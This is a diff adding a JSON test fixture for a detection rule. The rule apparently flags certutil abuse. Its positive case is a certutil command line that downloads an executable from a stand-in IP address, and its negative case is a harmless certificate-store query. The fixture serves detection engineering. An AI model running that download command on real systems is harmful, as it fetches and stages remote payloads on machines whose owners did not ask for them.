@@ -1,0 +1,14 @@
+{
+  "should_match": [
+    {
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe"
+    }
+  ],
+  "should_not_match": [
+    {
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -store my"
+    }
+  ]
+}
